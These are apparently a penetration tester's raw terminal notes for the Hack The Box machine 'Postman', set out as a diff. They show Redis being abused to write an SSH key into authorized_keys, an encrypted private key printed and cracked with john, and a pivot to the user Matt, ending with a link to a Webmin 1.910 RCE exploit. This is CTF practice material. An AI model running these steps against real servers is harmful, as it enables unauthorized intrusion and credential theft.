@@ -1,0 +1,363 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# redis-cli -h 10.10.10.160 -p 6379     
+10.10.10.160:6379> config get dir
+1) "dir"
+2) "/var/lib/redis"
+10.10.10.160:6379> 
+10.10.10.160:6379> config get *
+  1) "dbfilename"
+  2) "dump.rdb"
+  3) "requirepass"
+  4) ""
+  5) "masterauth"
+  6) ""
+  7) "cluster-announce-ip"
+  8) ""
+  9) "unixsocket"
+ 10) ""
+ 11) "logfile"
+ 12) "/var/log/redis/redis-server.log"
+ 13) "pidfile"
+ 14) "/var/run/redis/redis-server.pid"
+ 15) "slave-announce-ip"
+ 16) ""
+ 17) "maxmemory"
+ 18) "0"
+ 19) "proto-max-bulk-len"
+ 20) "536870912"
+ 21) "client-query-buffer-limit"
+ 22) "1073741824"
+ 23) "maxmemory-samples"
+ 24) "5"
+ 25) "lfu-log-factor"
+ 26) "10"
+ 27) "lfu-decay-time"
+ 28) "1"
+ 29) "timeout"
+ 30) "0"
+ 31) "active-defrag-threshold-lower"
+ 32) "10"
+ 33) "active-defrag-threshold-upper"
+ 34) "100"
+ 35) "active-defrag-ignore-bytes"
+ 36) "104857600"
+ 37) "active-defrag-cycle-min"
+ 38) "25"
+ 39) "active-defrag-cycle-max"
+ 40) "75"
+ 41) "auto-aof-rewrite-percentage"
+ 42) "100"
+ 43) "auto-aof-rewrite-min-size"
+ 44) "67108864"
+ 45) "hash-max-ziplist-entries"
+ 46) "512"
+ 47) "hash-max-ziplist-value"
+ 48) "64"
+ 49) "list-max-ziplist-size"
+ 50) "-2"
+ 51) "list-compress-depth"
+ 52) "0"
+ 53) "set-max-intset-entries"
+ 54) "512"
+ 55) "zset-max-ziplist-entries"
+ 56) "128"
+ 57) "zset-max-ziplist-value"
+ 58) "64"
+ 59) "hll-sparse-max-bytes"
+ 60) "3000"
+ 61) "lua-time-limit"
+ 62) "5000"
+ 63) "slowlog-log-slower-than"
+ 64) "10000"
+ 65) "latency-monitor-threshold"
+ 66) "0"
+ 67) "slowlog-max-len"
+ 68) "128"
+ 69) "port"
+ 70) "6379"
+ 71) "cluster-announce-port"
+ 72) "0"
+ 73) "cluster-announce-bus-port"
+ 74) "0"
+ 75) "tcp-backlog"
+ 76) "511"
+ 77) "databases"
+ 78) "16"
+ 79) "repl-ping-slave-period"
+ 80) "10"
+ 81) "repl-timeout"
+ 82) "60"
+ 83) "repl-backlog-size"
+ 84) "1048576"
+ 85) "repl-backlog-ttl"
+ 86) "3600"
+ 87) "maxclients"
+ 88) "10000"
+ 89) "watchdog-period"
+ 90) "0"
+ 91) "slave-priority"
+ 92) "100"
+ 93) "slave-announce-port"
+ 94) "0"
+ 95) "min-slaves-to-write"
+ 96) "0"
+ 97) "min-slaves-max-lag"
+ 98) "10"
+ 99) "hz"
+100) "10"
+101) "cluster-node-timeout"
+102) "15000"
+103) "cluster-migration-barrier"
+104) "1"
+105) "cluster-slave-validity-factor"
+106) "10"
+107) "repl-diskless-sync-delay"
+108) "5"
+109) "tcp-keepalive"
+110) "300"
+111) "cluster-require-full-coverage"
+112) "yes"
+113) "cluster-slave-no-failover"
+114) "no"
+115) "no-appendfsync-on-rewrite"
+116) "no"
+117) "slave-serve-stale-data"
+118) "yes"
+119) "slave-read-only"
+120) "yes"
+121) "stop-writes-on-bgsave-error"
+122) "yes"
+123) "daemonize"
+124) "yes"
+125) "rdbcompression"
+126) "yes"
+127) "rdbchecksum"
+128) "yes"
+129) "activerehashing"
+130) "yes"
+131) "activedefrag"
+132) "no"
+133) "protected-mode"
+134) "no"
+135) "repl-disable-tcp-nodelay"
+136) "no"
+137) "repl-diskless-sync"
+138) "no"
+139) "aof-rewrite-incremental-fsync"
+140) "yes"
+141) "aof-load-truncated"
+142) "yes"
+143) "aof-use-rdb-preamble"
+144) "no"
+145) "lazyfree-lazy-eviction"
+146) "no"
+147) "lazyfree-lazy-expire"
+148) "no"
+149) "lazyfree-lazy-server-del"
+150) "no"
+151) "slave-lazy-flush"
+152) "no"
+153) "maxmemory-policy"
+154) "noeviction"
+155) "loglevel"
+156) "notice"
+157) "supervised"
+158) "no"
+159) "appendfsync"
+160) "everysec"
+161) "syslog-facility"
+162) "local0"
+163) "appendonly"
+164) "no"
+165) "dir"
+166) "/var/lib/redis"
+167) "save"
+168) "900 1 300 10 60 10000"
+169) "client-output-buffer-limit"
+170) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
+171) "unixsocketperm"
+172) "0"
+173) "slaveof"
+174) ""
+175) "notify-keyspace-events"
+176) ""
+177) "bind"
+178) "0.0.0.0 ::1"
+10.10.10.160:6379> 
+
+
+
+                                                                                                                
+┌──(root㉿kali)-[/home/kali]
+└─# ssh-keygen -t ed25519 -f ~/.ssh/htb_key -N "" -C "htb-redis-key" 
+Generating public/private ed25519 key pair.
+/root/.ssh/htb_key already exists.
+Overwrite (y/n)? y
+Your identification has been saved in /root/.ssh/htb_key
+Your public key has been saved in /root/.ssh/htb_key.pub
+The key fingerprint is:
+SHA256:+c0jfFjB4g9e8V/e3DZrJaw9uv6g3Y6PNzRyCEdlirQ htb-redis-key
+The key's randomart image is:
++--[ED25519 256]--+
+|          .  .o  |
+|         . +.o   |
+|          E.=    |
+|         o...+   |
+|        S oooo. .|
+|         + Oo *+=|
+|          * B* +O|
+|           =.*=oo|
+|          ..BB*+ |
++----[SHA256]-----+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# (echo -e "\n\n"; cat /root/.ssh/htb_key.pub; echo -e "\n\n") > kali_key.txt 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat kali_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
+OK
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# redis-cli -h 10.10.10.160                                           
+10.10.10.160:6379> get ssh_key
+"\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG36wiuz/MirLEIvwkaZ7XoTMCcEclkGOHUUVsMT6ftP htb-redis-key\n\n\n\n"
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> config set dbfilename authorized_keys
+OK
+10.10.10.160:6379> save
+OK
+10.10.10.160:6379> exit
+                                                                                                                     
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i /root/.ssh/htb_key redis@10.10.10.160 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~$ 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# scp -i /root/.ssh/htb_key /usr/share/peass/linpeas/linpeas.sh redis@10.10.10.160:/tmp 
+linpeas.sh                                                                         100%  820KB   3.1MB/s   00:00    
+                             
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat id_rsa.bak                                             
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh2john id_rsa.bak > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+computer2008     (id_rsa.bak)     
+1g 0:00:00:00 DONE (2025-09-17 17:23) 4.347g/s 1073Kp/s 1073Kc/s 1073KC/s concubine..comett
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
+redis:x:107:114::/var/lib/redis:/bin/bash
+redis@Postman:/tmp$ su Matt
+Password: 
+su: Authentication failure
+redis@Postman:/tmp$ su Matt
+Password: 
+Matt@Postman:/tmp$ 
+
+
+nothing further so we use these credentials to login to
+
+https://10.10.10.160:10000/
+
+Webmin
+
+
+Matt@Postman:/etc$ find / -iname 'webmin' 2>/dev/null
+/run/lock/subsys/webmin
+/etc/init.d/webmin
+/etc/webmin
+/etc/webmin/webmin
+/etc/pam.d/webmin
+/usr/share/doc/webmin
+/usr/share/webmin
+/usr/share/webmin/authentic-theme/images/modules/webmin
+/usr/share/webmin/authentic-theme/images/favicons/webmin
+/usr/share/webmin/blue-theme/webmin
+/usr/share/webmin/webmin
+/usr/share/webmin/gray-theme/webmin
+
+Matt@Postman:/etc$ find /etc/webmin -iname 'version' 2>/dev/null
+/etc/webmin/version
+Matt@Postman:/etc$ cat /etc/webmin/version
+1.910
+Matt@Postman:/etc$ 
+
+
+its also on the webpage once we log in.
+
+https://github.com/KentVolt/Webmin-1.910-Exploit/blob/master/Webmin%201.910%20-%20Remote%20Code%20Execution%20using%20BurpSuite
+
+
+
+
+
+
+
+
+
+
+
